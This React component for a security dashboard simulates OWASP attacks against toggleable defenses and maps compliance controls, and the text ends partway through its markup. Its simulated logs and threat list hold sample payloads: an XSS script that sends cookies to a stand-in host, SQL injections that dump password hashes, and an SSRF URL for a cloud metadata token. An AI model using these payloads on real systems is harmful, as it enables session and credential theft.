import React, { useState, useEffect, useMemo, useRef } from "react";
import { 
  Shield, 
  ShieldAlert, 
  ShieldCheck, 
  Lock, 
  Key, 
  Server, 
  Eye, 
  AlertTriangle, 
  CheckCircle2, 
  Terminal, 
  Zap, 
  Search, 
  RefreshCw, 
  Database, 
  Cpu, 
  Globe, 
  FileText, 
  Layers, 
  Sliders, 
  TrendingUp, 
  UserX, 
  Trash2, 
  UserCheck, 
  Fingerprint, 
  FileLock2, 
  Activity,
  HeartPulse,
  Code2,
  LockKeyhole,
  Info
} from "lucide-react";

// --- TYPES & INTERFACES ---
type SecuritySubTab = "owasp_mitigation" | "threat_simulator" | "compliance_frameworks" | "secrets_encryption" | "specs";
type ThreatType = "sql_injection" | "xss_injection" | "ssrf_internal" | "credential_stuffing" | "api_abuse" | "ddos_flood";

interface ThreatVector {
  id: ThreatType;
  name: string;
  category: string;
  payload: string;
  severity: "critical" | "high" | "medium";
  mitigationName: string;
  technicalDetails: string;
  owaspReference: string;
}

interface ComplianceControl {
  id: string;
  title: string;
  domain: "GDPR" | "PCI-DSS" | "SOC2";
  requirement: string;
  status: "implemented" | "partially_implemented" | "not_applicable";
  architectureProof: string;
}

interface SimulatedAuditLog {
  id: string;
  timestamp: string;
  sourceIp: string;
  threatType: ThreatType | "system_audit";
  payloadMatched: string;
  actionTaken: "BLOCKED" | "ALLOWED" | "SCRUBBED" | "AUDITED";
  wafRuleMatched: string;
}

export default function SecurityArchitectureExplorer() {
  const [activeTab, setActiveTab] = useState<SecuritySubTab>("threat_simulator");
  const [wafActive, setWafActive] = useState<boolean>(true);
  const [cspActive, setCspActive] = useState<boolean>(true);
  const [kmsActive, setKmsActive] = useState<boolean>(true);
  const [zeroTrustActive, setZeroTrustActive] = useState<boolean>(true);

  // Dynamic simulation telemetry
  const [blockedRequestsCount, setBlockedRequestsCount] = useState<number>(14290);
  const [scannedDepsCount, setScannedDepsCount] = useState<number>(314);
  const [vulnerabilitiesCount, setVulnerabilitiesCount] = useState<number>(0);

  // Simulated Audit Logs
  const [auditLogs, setAuditLogs] = useState<SimulatedAuditLog[]>([
    {
      id: "LOG-01",
      timestamp: "23:51:00",
      sourceIp: "185.220.101.5",
      threatType: "sql_injection",
      payloadMatched: "UNION SELECT username, password_hash FROM users--",
      actionTaken: "BLOCKED",
      wafRuleMatched: "OWASP-SQLi-Rule-942100"
    },
    {
      id: "LOG-02",
      timestamp: "23:51:15",
      sourceIp: "94.140.14.14",
      threatType: "xss_injection",
      payloadMatched: "<script>fetch('http://malicious.evil/collect?cookie='+document.cookie)</script>",
      actionTaken: "BLOCKED",
      wafRuleMatched: "OWASP-XSS-Rule-941110"
    },
    {
      id: "LOG-03",
      timestamp: "23:51:30",
      sourceIp: "10.0.4.15",
      threatType: "system_audit",
      payloadMatched: "KMS Envelope key rotation completed successfully for /db/passenger_pii",
      actionTaken: "AUDITED",
      wafRuleMatched: "IAM-KMS-Auto-Rotation"
    }
  ]);

  // Static list of Threat Vectors with deep technical mappings
  const threatVectors: ThreatVector[] = useMemo(() => [
    {
      id: "sql_injection",
      name: "SQL Injection (SQLi)",
      category: "OWASP A03:2021-Injection",
      payload: "SELECT * FROM flights WHERE code = 'FS-101' OR 1=1;--",
      severity: "critical",
      mitigationName: "Drizzle ORM Parametrized Queries & Cloud Armor SQLi Rule Engine",
      technicalDetails: "Avoid standard raw SQL construction. All DB engines leverage type-safe prepared statements. Input parameters are bound as typed constants rather than executed directly as AST modifications. Cloud Armor enforces SQLi signatures on ingress.",
      owaspReference: "A03:2021-Injection"
    },
    {
      id: "xss_injection",
      name: "Cross-Site Scripting (XSS)",
      category: "OWASP A03:2021-Injection",
      payload: "<img src=x onerror=alert('xss_attack_vector_loaded')>",
      severity: "high",
      mitigationName: "Strict Content Security Policy (CSP) & React Auto-Escaping",
      technicalDetails: "Web client enforces dynamic Content-Security-Policy headers (default-src 'self'; script-src 'nonce-...' or 'strict-dynamic'). Inline script execution is blocked, and input text binding via React JSX automatically sanitizes script strings to prevent DOM insertion.",
      owaspReference: "A03:2021-Injection"
    },
    {
      id: "ssrf_internal",
      name: "Server-Side Request Forgery (SSRF)",
      category: "OWASP A10:2021-Server-Side Request Forgery",
      payload: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
      severity: "critical",
      mitigationName: "VPC Service Controls, Metadata Header Safeguards & Private DNS Resolution Only",
      technicalDetails: "Internal microservice fetching external partner data is containerized inside isolated subnets with egress restricted via Cloud NAT and firewall proxies. DNS allowlisting enforces strict validation of external URLs. Host meta-APIs require strict proprietary headers (e.g., 'Metadata-Flavor: Google') to block standard SSRF requests.",
      owaspReference: "A10:2021-SSRF"
    },
    {
      id: "credential_stuffing",
      name: "Bot Attacks & Credential Stuffing",
      category: "OWASP A07:2021-Identification and Authentication Failures",
      payload: "Rapid execution of 12,000 login queries matching leaked common database dictionary lists",
      severity: "high",
      mitigationName: "Cloud Armor Rate Limiting, JA3 TCP Fingerprinting & ReCAPTCHA Enterprise",
      technicalDetails: "Analyzes client SSL/TLS handshakes using JA3 hashing alongside behavior mapping. Blocks requests that display non-human timing characteristics or deviate from standard browser signatures, preventing automated login attempts.",
      owaspReference: "A07:2021-Auth-Failures"
    },
    {
      id: "api_abuse",
      name: "API Abuse & Token Manipulation",
      category: "OWASP A01:2021-Broken Access Control",
      payload: "GET /api/v2/flights/B-9901 (Scanning IDs to bypass Authorization check)",
      severity: "critical",
      mitigationName: "Zero-Trust Service-to-Service JWT Verification (mTLS + SPIFFE/SPIRE)",
      technicalDetails: "API endpoints validate incoming headers using strict cryptographically-signed JWT claims. Client requests include short-lived OAuth tokens. Internal container requests are authenticated using mutual TLS (mTLS) with SPIRE-issued workload identities, ensuring strict authorization bounds.",
      owaspReference: "A01:2021-Access-Control"
    },
    {
      id: "ddos_flood",
      name: "DDoS Layer 7 HTTP Flood",
      category: "Availability Threat",
      payload: "500,000 HTTP GET requests per second aimed at rendering homepage endpoints",
      severity: "high",
      mitigationName: "Anycast Edge Edge-Caches & Cloud Armor Auto-Scaling Shield",
      technicalDetails: "Leverages globally distributed Anycast Edge proxies to absorb volumetrics. High-frequency request patterns hit Edge-Caches, which offloads processing from origins. If load breaches thresholds, Cloud Armor automatically injects transient IP challenges.",
      owaspReference: "Infrastructure Protection"
    }
  ], []);

  // Static list of Compliance Controls & Proof mapping
  const complianceControls: ComplianceControl[] = useMemo(() => [
    {
      id: "COMP-01",
      title: "PII Pseudonymization & Masking",
      domain: "GDPR",
      requirement: "Article 32: Security of processing personal data",
      status: "implemented",
      architectureProof: "Customer profile and booking data columns (e.g. passenger names, credit profiles) are automatically scrubbed via Cloud DLP API pipelines before storage, and encrypted in Spanner with distinct cryptographic data cell keys."
    },
    {
      id: "COMP-02",
      title: "Right to be Forgotten",
      domain: "GDPR",
      requirement: "Article 17: Right to erasure",
      status: "implemented",
      architectureProof: "We support a standardized user erasure webhook. Triggering the event launches a coordinated multi-region transaction which deletes user records across Firestore/Spanner clusters and issues immediate tombstone cache evictions to Redis."
    },
    {
      id: "COMP-03",
      title: "Cardholder Data Isolation",
      domain: "PCI-DSS",
      requirement: "Requirement 3: Protect stored cardholder data",
      status: "implemented",
      architectureProof: "No actual credit card numbers (PAN) are parsed, transmitted, or written to our server disks. Payments are offloaded directly to PCI-DSS Level 1 compliant partners (Stripe Elements) using iframe tokenization, leaving our backend out of scope."
    },
    {
      id: "COMP-04",
      title: "Audit Trail Ingress Ledger",
      domain: "SOC2",
      requirement: "CC6.1: Boundary defense & administrative logging",
      status: "implemented",
      architectureProof: "Cloud Audit Logs tracks all infrastructure mutations. Access tokens, KMS key decryptions, and admin operations write immutably to encrypted Cloud Storage buckets with write-once-read-many (WORM) lifecycle parameters."
    },
    {
      id: "COMP-05",
      title: "Supply Chain Dependabot Guardrails",
      domain: "SOC2",
      requirement: "CC7.1: Vulnerability management in container environments",
      status: "partially_implemented",
      architectureProof: "All repository additions trigger automated Snyk dependencies scanners inside GitHub Actions. Container builds are checked for vulnerabilities using Artifact Analysis API before shipping to Cloud Run."
    }
  ], []);

  // Fluctuate blocked requests over time
  useEffect(() => {
    const timer = setInterval(() => {
      setBlockedRequestsCount(prev => prev + Math.floor(Math.random() * 3) + 1);
    }, 4000);
    return () => clearInterval(timer);
  }, []);

  // Interactive Threat Penetration Injection Handler
  const simulateAttackInfiltration = (type: ThreatType) => {
    const selectedThreat = threatVectors.find(t => t.id === type);
    if (!selectedThreat) return;

    const sourceIps = ["45.138.99.12", "195.42.100.22", "82.165.4.15", "104.244.42.1", "185.190.141.25"];
    const ip = sourceIps[Math.floor(Math.random() * sourceIps.length)];
    const time = new Date().toTimeString().split(" ")[0];

    const isMitigated = 
      (type === "sql_injection" && wafActive) || 
      (type === "xss_injection" && cspActive) || 
      (type === "ssrf_internal" && zeroTrustActive) ||
      (type === "credential_stuffing" && wafActive) ||
      (type === "api_abuse" && zeroTrustActive) ||
      (type === "ddos_flood" && wafActive);

    const log: SimulatedAuditLog = {
      id: `LOG-${Math.floor(Math.random() * 90000) + 10000}`,
      timestamp: time,
      sourceIp: ip,
      threatType: type,
      payloadMatched: selectedThreat.payload,
      actionTaken: isMitigated ? (type === "xss_injection" ? "SCRUBBED" : "BLOCKED") : "ALLOWED",
      wafRuleMatched: isMitigated 
        ? type === "sql_injection" ? "Cloud-Armor-SQLi-Engine" 
          : type === "xss_injection" ? "CSP-Directive-Block"
          : type === "ssrf_internal" ? "VPC-Access-Control-Reject"
          : type === "credential_stuffing" ? "JA3-Bot-Reputation"
          : type === "api_abuse" ? "SPIFFE-Identity-Validation-Fail"
          : "Volumetric-Edge-Challenge"
        : "None (Security controls disabled)"
    };

    setAuditLogs(prev => [log, ...prev].slice(0, 15));
    
    if (isMitigated) {
      setBlockedRequestsCount(prev => prev + 1);
    } else {
      setVulnerabilitiesCount(prev => prev + 1);
    }
  };

  const healVulnerabilities = () => {
    setVulnerabilitiesCount(0);
    setWafActive(true);
    setCspActive(true);
    setKmsActive(true);
    setZeroTrustActive(true);
    
    // Log a system event
    const time = new Date().toTimeString().split(" ")[0];
    setAuditLogs(prev => [
      {
        id: `LOG-SYSTEM-${Date.now()}`,
        timestamp: time,
        sourceIp: "127.0.0.1",
        threatType: "system_audit",
        payloadMatched: "System administrators enabled comprehensive security control shielding. Hot patching complete.",
        actionTaken: "AUDITED",
        wafRuleMatched: "SRE-Global-Hardening"
      },
      ...prev
    ].slice(0, 15));
  };

  return (
    <div className="space-y-6" id="security-architecture-explorer">
      
      {/* 1. Header with Global Security Controls */}
      <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 backdrop-blur-md shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-80 h-40 bg-rose-500/5 blur-[120px] rounded-full pointer-events-none" />
        <div className="absolute bottom-0 left-0 w-80 h-40 bg-indigo-500/5 blur-[120px] rounded-full pointer-events-none" />
        
        <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4 border-b border-slate-800/80 pb-5">
          <div>
            <div className="flex items-center gap-2">
              <span className="flex h-2 w-2 relative">
                <span className={`animate-ping absolute inline-flex h-full w-full rounded-full opacity-75 ${vulnerabilitiesCount > 0 ? "bg-rose-400" : "bg-emerald-400"}`}></span>
                <span className={`relative inline-flex rounded-full h-2 w-2 ${vulnerabilitiesCount > 0 ? "bg-rose-500" : "bg-emerald-500"}`}></span>
              </span>
              <span className={`text-[10px] font-mono uppercase tracking-widest font-bold ${vulnerabilitiesCount > 0 ? "text-rose-400" : "text-emerald-400"}`}>
                SEC OPS HEALTH: {vulnerabilitiesCount > 0 ? `${vulnerabilitiesCount} ACTIVE EXPLOITS DETECTED` : "SECURE SHELL INTEGRITY OK"}
              </span>
            </div>
            <h2 className="text-xl font-black text-slate-100 mt-1 tracking-tight flex items-center gap-2">
              <Shield className="w-5.5 h-5.5 text-rose-500" />
              <span>OWASP Top 10 Security Architecture & Threat Shield</span>
            </h2>
            <p className="text-xs text-slate-400 mt-1 max-w-2xl leading-relaxed">
              Analyze the multi-layered security infrastructure protecting the global transaction mesh. Simulate OWASP exploits, test defensive responses, and audit live container, cloud, and PII protection mechanisms.
            </p>
          </div>
          
          <div className="flex flex-wrap items-center gap-2.5">
            {vulnerabilitiesCount > 0 && (
              <button
                onClick={healVulnerabilities}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold bg-rose-950 border border-rose-500/30 text-rose-400 animate-pulse cursor-pointer"
              >
                <ShieldCheck className="w-3.5 h-3.5" />
                <span>Hot Patch Vulnerabilities</span>
              </button>
            )}

            <div className="flex items-center gap-2 text-[10px] font-mono text-slate-500 bg-slate-950 px-3 py-2 border border-slate-800 rounded-lg">
              <span>WAF Attacks Prevented:</span>
              <strong className="text-emerald-400 font-bold">{blockedRequestsCount.toLocaleString()}</strong>
            </div>
          </div>
        </div>

        {/* Real-time Interactive Toggles for Defensive Controls */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3.5 mt-5">
          
          {/* Toggle WAF */}
          <button
            onClick={() => {
              setWafActive(!wafActive);
              setAuditLogs(prev => [
                {
                  id: `LOG-WAF-${Date.now()}`,
                  timestamp: new Date().toTimeString().split(" ")[0],
                  sourceIp: "127.0.0.1",
                  threatType: "system_audit",
                  payloadMatched: `Cloud Armor WAF Rules toggled to: ${!wafActive ? "ACTIVE" : "INACTIVE"}`,
                  actionTaken: "AUDITED",
                  wafRuleMatched: "ADMIN-WAF-Toggle"
                },
                ...prev
              ]);
            }}
            className={`flex flex-col items-start p-3.5 rounded-xl border transition-all text-left relative overflow-hidden cursor-pointer ${
              wafActive 
                ? "bg-slate-900/60 border-slate-800 text-slate-100 hover:border-slate-700" 
                : "bg-rose-950/20 border-rose-500/10 text-slate-400 hover:border-rose-500/20"
            }`}
          >
            <div className="flex items-center gap-2 w-full justify-between">
              <span className="text-[10px] font-mono text-slate-400 uppercase tracking-wider font-semibold">Web App Firewall</span>
              <span className={`h-1.5 w-1.5 rounded-full ${wafActive ? "bg-emerald-400" : "bg-rose-500 animate-ping"}`} />
            </div>
            <strong className="text-xs font-bold mt-2 flex items-center gap-1">
              <Server className={`w-3.5 h-3.5 ${wafActive ? "text-sky-400" : "text-rose-500"}`} />
              <span>Cloud Armor WAF</span>
            </strong>
            <span className="text-[9px] text-slate-500 mt-1 block">Blocks SQLi, XSS, and L7 floods</span>
          </button>

          {/* Toggle CSP */}
          <button
            onClick={() => {
              setCspActive(!cspActive);
              setAuditLogs(prev => [
                {
                  id: `LOG-CSP-${Date.now()}`,
                  timestamp: new Date().toTimeString().split(" ")[0],
                  sourceIp: "127.0.0.1",
                  threatType: "system_audit",
                  payloadMatched: `Content Security Policy (CSP) headers toggled to: ${!cspActive ? "STRICT_CSP" : "DISABLE_CSP_FALLBACK"}`,
                  actionTaken: "AUDITED",
                  wafRuleMatched: "ADMIN-CSP-Toggle"
                },
                ...prev
              ]);
            }}
            className={`flex flex-col items-start p-3.5 rounded-xl border transition-all text-left relative overflow-hidden cursor-pointer ${
              cspActive 
                ? "bg-slate-900/60 border-slate-800 text-slate-100 hover:border-slate-700" 
                : "bg-rose-950/20 border-rose-500/10 text-slate-400 hover:border-rose-500/20"
            }`}
          >
            <div className="flex items-center gap-2 w-full justify-between">
              <span className="text-[10px] font-mono text-slate-400 uppercase tracking-wider font-semibold">Browser Headers</span>
              <span className={`h-1.5 w-1.5 rounded-full ${cspActive ? "bg-emerald-400" : "bg-rose-500"}`} />
            </div>
            <strong className="text-xs font-bold mt-2 flex items-center gap-1">
              <Code2 className={`w-3.5 h-3.5 ${cspActive ? "text-indigo-400" : "text-rose-500"}`} />
              <span>Strict CSP Headers</span>
            </strong>
            <span className="text-[9px] text-slate-500 mt-1 block">Prevents DOM injections & cookie theft</span>
          </button>

          {/* Toggle KMS Envelope encryption */}
          <button
            onClick={() => {
              setKmsActive(!kmsActive);
              setAuditLogs(prev => [
                {
                  id: `LOG-KMS-${Date.now()}`,
                  timestamp: new Date().toTimeString().split(" ")[0],
                  sourceIp: "127.0.0.1",
                  threatType: "system_audit",
                  payloadMatched: `Database table encryption keys toggled to: ${!kmsActive ? "ENVELOPE_KMS_AES256" : "PLAINTEXT_CELL_LOGICAL"}`,
                  actionTaken: "AUDITED",
                  wafRuleMatched: "ADMIN-KMS-Toggle"
                },
                ...prev
              ]);
            }}
            className={`flex flex-col items-start p-3.5 rounded-xl border transition-all text-left relative overflow-hidden cursor-pointer ${
              kmsActive 
                ? "bg-slate-900/60 border-slate-800 text-slate-100 hover:border-slate-700" 
                : "bg-rose-950/20 border-rose-500/10 text-slate-400 hover:border-rose-500/20"
            }`}
          >
            <div className="flex items-center gap-2 w-full justify-between">
              <span className="text-[10px] font-mono text-slate-400 uppercase tracking-wider font-semibold">Data Encryption</span>
              <span className={`h-1.5 w-1.5 rounded-full ${kmsActive ? "bg-emerald-400" : "bg-rose-500"}`} />
            </div>
            <strong className="text-xs font-bold mt-2 flex items-center gap-1">
              <LockKeyhole className={`w-3.5 h-3.5 ${kmsActive ? "text-amber-400" : "text-rose-500"}`} />
              <span>KMS Envelope Crypt</span>
            </strong>
            <span className="text-[9px] text-slate-500 mt-1 block">Hardware-backed AES-GCM-256</span>
          </button>

          {/* Toggle Zero Trust */}
          <button
            onClick={() => {
              setZeroTrustActive(!zeroTrustActive);
              setAuditLogs(prev => [
                {
                  id: `LOG-ZT-${Date.now()}`,
                  timestamp: new Date().toTimeString().split(" ")[0],
                  sourceIp: "127.0.0.1",
                  threatType: "system_audit",
                  payloadMatched: `Zero-Trust internal network checks toggled to: ${!zeroTrustActive ? "SPIFFE_MTLS_ENFORCED" : "TRUST_CONTAINER_NETWORK_DEFAULT"}`,
                  actionTaken: "AUDITED",
                  wafRuleMatched: "ADMIN-ZT-Toggle"
                },
                ...prev
              ]);
            }}
            className={`flex flex-col items-start p-3.5 rounded-xl border transition-all text-left relative overflow-hidden cursor-pointer ${
              zeroTrustActive 
                ? "bg-slate-900/60 border-slate-800 text-slate-100 hover:border-slate-700" 
                : "bg-rose-950/20 border-rose-500/10 text-slate-400 hover:border-rose-500/20"
            }`}
          >
            <div className="flex items-center gap-2 w-full justify-between">
              <span className="text-[10px] font-mono text-slate-400 uppercase tracking-wider font-semibold">Zero-Trust Network</span>
              <span className={`h-1.5 w-1.5 rounded-full ${zeroTrustActive ? "bg-emerald-400" : "bg-rose-500"}`} />
            </div>
            <strong className="text-xs font-bold mt-2 flex items-center gap-1">
              <Fingerprint className={`w-3.5 h-3.5 ${zeroTrustActive ? "text-teal-400" : "text-rose-500"}`} />
              <span>Workload identities</span>
            </strong>
            <span className="text-[9px] text-slate-500 mt-1 block">mTLS + container workload checking</span>
          </button>

        </div>

        {/* Navigation Tabs */}
        <div className="flex border-t border-slate-850 mt-4 pt-4 justify-between items-center flex-wrap gap-2">
          <div className="flex items-center bg-slate-950/80 border border-slate-800 rounded-xl p-1">
            <button
              onClick={() => setActiveTab("threat_simulator")}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-lg text-xs font-bold transition-all ${
                activeTab === "threat_simulator"
                  ? "bg-slate-900 border border-slate-800 text-rose-455 shadow-lg"
                  : "text-slate-400 hover:text-slate-200"
              }`}
            >
              <ShieldAlert className="w-4 h-4 text-rose-500" />
              <span>Threat Simulator & Penetration sandbox</span>
            </button>

            <button
              onClick={() => setActiveTab("owasp_mitigation")}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-lg text-xs font-bold transition-all ${
                activeTab === "owasp_mitigation"
                  ? "bg-slate-900 border border-slate-800 text-indigo-400 shadow-lg"
                  : "text-slate-400 hover:text-slate-200"
              }`}
            >
              <Layers className="w-4 h-4 text-indigo-400" />
              <span>OWASP Top 10 Mapping</span>
            </button>

            <button
              onClick={() => setActiveTab("compliance_frameworks")}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-lg text-xs font-bold transition-all ${
                activeTab === "compliance_frameworks"
                  ? "bg-slate-900 border border-slate-800 text-emerald-400 shadow-lg"
                  : "text-slate-400 hover:text-slate-200"
              }`}
            >
              <FileLock2 className="w-4 h-4 text-emerald-400" />
              <span>GDPR, PCI, SOC2 Compliance</span>
            </button>

            <button
              onClick={() => setActiveTab("secrets_encryption")}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-lg text-xs font-bold transition-all ${
                activeTab === "secrets_encryption"
                  ? "bg-slate-900 border border-slate-800 text-amber-400 shadow-lg"
                  : "text-slate-400 hover:text-slate-200"
              }`}
            >
              <Key className="w-4 h-4 text-amber-400" />
              <span>Secrets & Key Vault Management</span>
            </button>

            <button
              onClick={() => setActiveTab("specs")}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-lg text-xs font-bold transition-all ${
                activeTab === "specs"
                  ? "bg-slate-900 border border-slate-800 text-teal-400 shadow-lg"
                  : "text-slate-400 hover:text-slate-200"
              }`}
            >
              <Terminal className="w-4 h-4 text-teal-400" />
              <span>Security Specs</span>
            </button>
          </div>
        </div>

      </div>

      {/* 2. Main Content Layout */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        
        {/* Left Interactive Panel */}
        <div className="lg:col-span-8 space-y-6">
          
          {/* A. Threat Simulator & Penetration sandbox */}
          {activeTab === "threat_simulator" && (
            <div className="bg-slate-900/40 border border-slate-800 rounded-2xl p-6 backdrop-blur-sm space-y-6">
              <div className="border-b border-slate-800/60 pb-4">
                <h3 className="text-base font-bold text-slate-100 flex items-center gap-2">
                  <ShieldAlert className="w-5 h-5 text-rose-500" />
                  <span>OWASP Penetration & Injection Attack Simulator</span>
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Launch simulated cyber-attacks matching common high-severity exploits. Watch our defensive architecture (WAF, CSP, KMS, and Workload identities) parse, intercept, and block threats in real-time. Toggle individual guards above to observe what happens under compromise.
                </p>
              </div>

              {/* Grid of Interactive Attack Launchers */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {threatVectors.map((threat) => {
                  const isBlocked = 
                    (threat.id === "sql_injection" && wafActive) || 
                    (threat.id === "xss_injection" && cspActive) || 
                    (threat.id === "ssrf_internal" && zeroTrustActive) ||
                    (threat.id === "credential_stuffing" && wafActive) ||
                    (threat.id === "api_abuse" && zeroTrustActive) ||
                    (threat.id === "ddos_flood" && wafActive);

                  return (
                    <div 
                      key={threat.id} 
                      className={`bg-slate-950/50 border rounded-xl p-4 flex flex-col justify-between transition-all hover:bg-slate-950/70 ${
                        isBlocked ? "border-slate-850" : "border-rose-550/20 bg-rose-950/5"
                      }`}
                    >
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-[10px] font-mono text-slate-500 uppercase">{threat.category}</span>
                          <span className={`text-[9px] font-mono uppercase px-1.5 py-0.5 rounded font-bold ${
                            threat.severity === "critical" ? "bg-red-950 text-red-400 border border-red-500/20" : "bg-orange-950 text-orange-400 border border-orange-500/20"
                          }`}>
                            {threat.severity}
                          </span>
                        </div>
                        
                        <strong className="text-xs text-slate-200 block font-bold">{threat.name}</strong>
                        
                        <div className="bg-slate-900 border border-slate-850 p-2 rounded text-[10px] font-mono text-slate-400 overflow-x-auto select-all max-h-[50px]">
                          <code>{threat.payload}</code>
                        </div>

                        <p className="text-[11px] text-slate-400 leading-normal font-semibold">
                          Mitigation: <strong className="text-slate-300">{threat.mitigationName}</strong>
                        </p>
                      </div>

                      <div className="pt-3 mt-3 border-t border-slate-900 flex items-center justify-between gap-2">
                        <span className="text-[10px] font-mono text-slate-500">
                          Status: <strong className={isBlocked ? "text-emerald-400" : "text-rose-500"}>{isBlocked ? "SHIELDED" : "COMPROMISED"}</strong>
                        </span>
                        
                        <button
                          onClick={() => simulateAttackInfiltration(threat.id)}
                          className={`px-3 py-1 rounded text-[10px] font-mono font-bold border transition-all cursor-pointer ${
                            isBlocked 
                              ? "bg-slate-900 hover:bg-slate-850 text-slate-300 border-slate-800" 
                              : "bg-rose-950 hover:bg-rose-900 text-rose-400 border-rose-900/40 animate-pulse"
                          }`}
                        >
                          Execute Payload
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Live WAF & Access Control Audit Log Stream */}
              <div className="bg-slate-950 border border-slate-850 rounded-xl p-4 space-y-3.5">
                <div className="flex items-center justify-between border-b border-slate-850 pb-2">
                  <span className="text-xs font-bold text-slate-200 font-mono uppercase flex items-center gap-1.5">
                    <Terminal className="w-3.5 h-3.5 text-rose-500" />
                    WAF Security Log & Access Control Audit Trail
                  </span>
                  <span className="text-[9px] text-slate-500 font-mono animate-pulse">Monitoring Port 3000 Ingress</span>
                </div>

                <div className="space-y-1.5 font-mono text-[10.5px] max-h-[190px] overflow-y-auto pr-1">
                  {auditLogs.map((log) => {
                    let badgeColor = "bg-emerald-950 text-emerald-400 border border-emerald-500/10";
                    if (log.actionTaken === "BLOCKED") badgeColor = "bg-rose-950 text-rose-400 border border-rose-500/10";
                    if (log.actionTaken === "SCRUBBED") badgeColor = "bg-amber-950 text-amber-400 border border-amber-500/10";

                    return (
                      <div key={log.id} className="p-2.5 bg-slate-900/60 border border-slate-850/60 rounded flex flex-col md:flex-row md:items-center md:justify-between gap-2 hover:bg-slate-900">
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            <span className="text-slate-500">[{log.timestamp}]</span>
                            <span className="text-slate-300 font-bold">{log.sourceIp}</span>
                            <span className="text-slate-500">→</span>
                            <span className="text-slate-400 text-[10px]">{log.threatType.toUpperCase()}</span>
                          </div>
                          <div className="text-slate-450 italic truncate max-w-lg">
                            Payload: {log.payloadMatched}
                          </div>
                        </div>

                        <div className="text-left md:text-right shrink-0">
                          <span className={`inline-block px-1.5 py-0.2 rounded font-black text-[9px] tracking-wide ${badgeColor}`}>
                            {log.actionTaken}
                          </span>
                          <span className="text-[9px] text-slate-500 block mt-1">Rule: {log.wafRuleMatched}</span>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

            </div>
          )}

          {/* B. OWASP Top 10 Mapping */}
          {activeTab === "owasp_mitigation" && (
            <div className="bg-slate-900/40 border border-slate-800 rounded-2xl p-6 backdrop-blur-sm space-y-6">
              <div className="border-b border-slate-800/60 pb-4">
                <h3 className="text-base font-bold text-slate-100 flex items-center gap-2">
                  <Layers className="w-5 h-5 text-indigo-400" />
                  <span>OWASP Top 10:2021 Reference Architecture & Mappings</span>
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Our application is engineered with structural defense boundaries designed to systematically eliminate OWASP categories before they enter runtime phases.
                </p>
              </div>

              <div className="space-y-4">
                {[
                  {
                    title: "A01:2021-Broken Access Control",
                    description: "Enforce least privilege mapping. We integrate Google Identity-Aware Proxy (IAP) + strict JWT scopes. All resource routers parse the JWT claim to confirm user ownership before execution.",
                    elements: ["Fine-grained RBAC in GCP IAM", "OAuth 2.0 Client Credentials", "Row-Level Security (RLS) on PostgreSQL tables"]
                  },
                  {
                    title: "A02:2021-Cryptographic Failures",
                    description: "All client payload transit uses TLS 1.3 enforced by GKE fronting Cloud Load Balancer. Encrypted cell fields in databases leverage envelope keys rotated weekly via KMS HSM hardware.",
                    elements: ["HSTS (HTTP Strict Transport Security)", "TLS 1.3 with ECC secure cipher suite", "BoringSSL crypto standard enforcement"]
                  },
                  {
                    title: "A03:2021-Injection (SQLi & XSS)",
                    description: "Strict compile-time SQL structure bindings via Drizzle ORM. Standard React DOM node parser blocks browser injection vectors by defaulting element properties to text-escaped strings.",
                    elements: ["Parametrized DB prepare bindings", "Cloud Armor WAF core signature profiling", "Strict client side HTML sanitizers"]
                  },
                  {
                    title: "A05:2021-Security Misconfiguration",
                    description: "Infrastructure is declared purely as code (Terraform) and audited using static security checks (tfsec, Checkov) before execution, eliminating human configuration mistakes.",
                    elements: ["WORM audit logs in Cloud Storage", "Disabled container SSH access", "gVisor microvm network isolation layers"]
                  },
                  {
                    title: "A08:2021-Software and Data Integrity Failures",
                    description: "Supply chain pipeline scanner (Snyk) maps dependencies for CVEs during pull request loops. Built Docker containers are cryptographically signed using Cosign (Binary Authorization).",
                    elements: ["Dependabot Automated PR bumps", "Signed Artifact Registry containers", "SHA-256 validation of custom node_modules packages"]
                  }
                ].map((category, index) => (
                  <div key={index} className="bg-slate-950/40 border border-slate-800 p-4 rounded-xl space-y-2">
                    <strong className="text-xs font-bold text-indigo-400 font-mono block">{category.title}</strong>
                    <p className="text-[11px] text-slate-400 leading-relaxed font-semibold">{category.description}</p>
                    <div className="flex flex-wrap gap-1.5 pt-1.5">
                      {category.elements.map((el, elIdx) => (
                        <span key={elIdx} className="text-[9px] font-mono bg-slate-900 border border-slate-850 text-slate-300 px-2 py-0.5 rounded">
                          {el}
                        </span>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* C. Compliance Frameworks */}
          {activeTab === "compliance_frameworks" && (
            <div className="bg-slate-900/40 border border-slate-800 rounded-2xl p-6 backdrop-blur-sm space-y-6">
              <div className="border-b border-slate-800/60 pb-4">
                <h3 className="text-base font-bold text-slate-100 flex items-center gap-2">
                  <FileLock2 className="w-5 h-5 text-emerald-400" />
                  <span>Regulatory Compliance Mapping (GDPR, PCI-DSS, SOC2)</span>
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Compliance is built into the architecture. Inspect how regulatory requirements are mapped to actual physical or logical architecture proofs in our code-base.
                </p>
              </div>

              {/* Compliance list */}
              <div className="space-y-3.5">
                {complianceControls.map((control) => (
                  <div key={control.id} className="bg-slate-950/40 border border-slate-800 p-4 rounded-xl flex items-start gap-4">
                    <div className="shrink-0 mt-0.5">
                      <span className="text-[10px] font-bold font-mono px-2 py-1 bg-emerald-950 text-emerald-400 border border-emerald-900/40 rounded uppercase block text-center min-w-[75px]">
